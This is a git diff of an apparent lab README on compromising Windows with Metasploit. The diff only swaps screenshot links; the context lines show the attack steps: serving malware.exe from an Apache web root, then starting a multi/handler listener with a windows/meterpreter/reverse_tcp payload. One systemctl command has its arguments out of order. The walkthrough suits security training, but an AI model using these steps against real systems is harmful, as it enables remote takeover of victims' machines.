@@ -42,20 +42,25 @@ copy the malware.exe into the apache /var/www/html folder
 Start apache server
 sudo systemctl apache2 start
 
-![startapache2](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/f2bdb40b-22b8-409e-8295-7cac780eab89)
+![image](https://github.com/Bhargava-Shankar/Compromising-windows-using-Metasploit/assets/85554376/5650d9f0-c4c1-411a-a21a-5a45ffa361a0)
+
 
 Check the status of apache2
 
-![status](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d5dca89e-d102-408d-aa25-d60e7e09ff2b)
+![image](https://github.com/Bhargava-Shankar/Compromising-windows-using-Metasploit/assets/85554376/0441b4c9-e7d5-4318-96cb-1a6b720c4b8a)
+
 
 Invoke msfconsole:
+![image](https://github.com/Bhargava-Shankar/Compromising-windows-using-Metasploit/assets/85554376/c9292e2c-4905-421a-8742-a940f596b4f5)
+
 ## OUTPUT:
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
 Starting a command and control Server
 use multi/handler
 
-![usemultihandler](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/31c4d664-f12a-45a9-aa29-e988f03e88e1)
+![image](https://github.com/Bhargava-Shankar/Compromising-windows-using-Metasploit/assets/85554376/54aeae61-a82f-4069-b2da-a6673e89135f)
+
 
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
